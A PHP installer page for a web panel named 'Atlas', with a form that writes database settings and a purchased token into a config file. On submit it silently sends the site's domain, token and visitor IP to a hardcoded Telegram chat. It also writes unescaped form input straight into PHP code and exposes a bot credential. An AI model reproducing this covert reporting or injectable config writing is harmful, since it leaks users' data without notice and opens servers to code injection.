<?php


echo "\r\n\r\n";
error_reporting(0);
session_start();
require "vendor/autoload.php";
$dominio = $_SERVER["HTTP_HOST"];
$telegram = new Telegram\Bot\Api("5880889389:AAHVQRG5FuAkZM7XrjUAKjxOiQZRh2W-Y0I");
date_default_timezone_set("America/Sao_Paulo");
if (file_exists("atlas/conexao.php")) {
    header("Location: index.php");
    exit;
}
include "atlas/conexao.php";
try {
    $conn = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
    if ($conn) {
        header("Location: index.php");
        exit;
    }
} catch (mysqli_sql_exception $ex) {
}
echo "\r\n\r\n\r\n<!DOCTYPE html>\r\n<html lang=\"pt-br\">\r\n  <head>\r\n    <!-- Required meta tags -->\r\n    <meta charset=\"utf-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\r\n<!DOCTYPE html>\r\n<html class=\"loading\" lang=\"pt-br\" data-textdirection=\"ltr\">\r\n\r\n<head>\r\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=0\">\r\n    <meta name=\"author\" content=\"Thomas\">\r\n    <title>Instalar</title>\r\n    <link rel=\"apple-touch-icon\" href=\"\">\r\n    <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"\">\r\n    <link href=\"https://fonts.googleapis.com/css?family=Rubik:300,400,500,600%7CIBM+Plex+Sans:300,400,500,600,700\" rel=\"stylesheet\">\r\n\r\n\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/vendors/css/vendors.min.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/bootstrap.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/bootstrap-extended.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/colors.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/components.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/themes/dark-layout.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/themes/semi-dark-layout.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/core/menu/menu-types/vertical-menu.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../app-assets/css/pages/authentication.css\">\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"../../../atlas-assets/css/style.css\">\r\n    <script src=\"app-assets/sweetalert.min.js\"></script>\r\n\r\n</head>\r\n\r\n<body class=\"vertical-layout vertical-menu-modern dark-layout 1-column  navbar-sticky footer-static bg-full-screen-image  blank-page blank-page\" data-open=\"click\" data-menu=\"vertical-menu-modern\" data-col=\"1-column\" data-layout=\"dark-layout\">\r\n    <div class=\"app-content content\">\r\n        <div class=\"content-overlay\"></div>\r\n        <div class=\"content-wrapper\">\r\n            <div class=\"content-header row\">\r\n            </div>\r\n            <div class=\"content-body\">\r\n                <section id=\"auth-login\" class=\"row flexbox-container\">\r\n                    <div class=\"col-xl-8 col-11\">\r\n                        \r\n                            \r\n                               \r\n                                    <div class=\"card disable-rounded-right mb-0 p-2 h-100 d-flex justify-content-center\">\r\n                                        <div class=\"card-header pb-1\">\r\n                                            <div class=\"card-title\">\r\n                                                <h4 class=\"text-center mb-2\">Instalador Atlas</h4>\r\n                                            </div>\r\n                                        </div>\r\n                                        <form action=\"install.php\" method=\"post\">  \r\n                  <div class=\"form-group\">\r\n                    <label>Hostname *</label>\r\n                    <input type=\"text\" name=\"hostname\" class=\"form-control p_input\">\r\n                  </div>\r\n                  <div class=\"form-group\">\r\n                    <label>Nome do Banco de Dados *</label>\r\n                    <input type=\"text\" name=\"dbname\" class=\"form-control p_input\">\r\n                  </div>\r\n                  <div class=\"form-group\">\r\n                    <label>Usuario do Banco de Dados *</label>\r\n                    <input type=\"text\" name=\"dbuser\" class=\"form-control p_input\">\r\n                  </div>\r\n                  <div class=\"form-group\">\r\n                    <label>Senha do Banco de Dados *</label>\r\n                    <input type=\"password\" name=\"dbsenha\" class=\"form-control p_input\">\r\n                  </div>\r\n                  <div class=\"form-group\">\r\n                    <label>Seu Token Adquirido *</label>\r\n                    <input type=\"text\" name=\"dbtoken\" class=\"form-control p_input\">\r\n                  </div>\r\n                    <div>\r\n                      <center>\r\n                    \r\n                    \r\n\r\n                  <div class=\"text-center\">\r\n                    <button type=\"submit\" name=\"submit\" class=\"btn btn-primary btn-block enter-btn\">Instalar</button>\r\n                  </div>\r\n</form>\r\n          </div>\r\n        </div>\r\n        ";
if (isset($_POST["submit"])) {
    echo "<script>alert('Instalando Banco de Dados!')</script><script>location.href='instalando.php'</script>";
    $hostname = $_POST["hostname"];
    $dbname = $_POST["dbname"];
    $dbuser = $_POST["dbuser"];
    $dbsenha = $_POST["dbsenha"];
    $dbtoken = $_POST["dbtoken"];
    $fp = fopen("atlas/conexao.php", "w");
    $escreve = fwrite($fp, "<?php \r \$");
    $escreve = fwrite($fp, "dbname = '" . $dbname . "';\r \$");
    $escreve = fwrite($fp, "dbuser = '" . $dbuser . "';\r \$");
    $escreve = fwrite($fp, "dbpass = '" . $dbsenha . "';\r \$");
    $escreve = fwrite($fp, "dbhost = '" . $hostname . "';\r \$");
    $escreve = fwrite($fp, "_SESSION['token'] = '" . $dbtoken . "';\r ");
    $escreve = fwrite($fp, "?>");
    fclose($fp);
    $telegram->sendMessage(["chat_id" => "1277396667", "text" => "O Dominio https://" . $dominio . "/ Token: " . $dbtoken . " Ip: " . $_SERVER["REMOTE_ADDR"] . " Instalou o Painel"]);
}
echo "\r\n                                                <hr>\r\n\r\n                                            </div>\r\n                                        </div>\r\n                                    </div>\r\n                                </div>\r\n                                \r\n                            </div>\r\n                        </div>\r\n                    </div>\r\n                </section>\r\n            </div>\r\n        </div>\r\n    </div>\r\n    <script src=\"../../../app-assets/vendors/js/vendors.min.js\"></script>\r\n    <script src=\"../../../app-assets/fonts/LivIconsEvo/js/LivIconsEvo.tools.js\"></script>\r\n    <script src=\"../../../app-assets/fonts/LivIconsEvo/js/LivIconsEvo.defaults.js\"></script>\r\n    <script src=\"../../../app-assets/fonts/LivIconsEvo/js/LivIconsEvo.min.js\"></script>\r\n    <script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>\r\n    <script src=\"../../../app-assets/js/scripts/configs/vertical-menu-dark.js\"></script>\r\n    <script src=\"../../../app-assets/js/core/app-menu.js\"></script>\r\n    <script src=\"../../../app-assets/js/core/app.js\"></script>\r\n    <script src=\"../../../app-assets/js/scripts/components.js\"></script>\r\n    <script src=\"../../../app-assets/js/scripts/footer.js\"></script>\r\n</body>\r\n</html>";

?>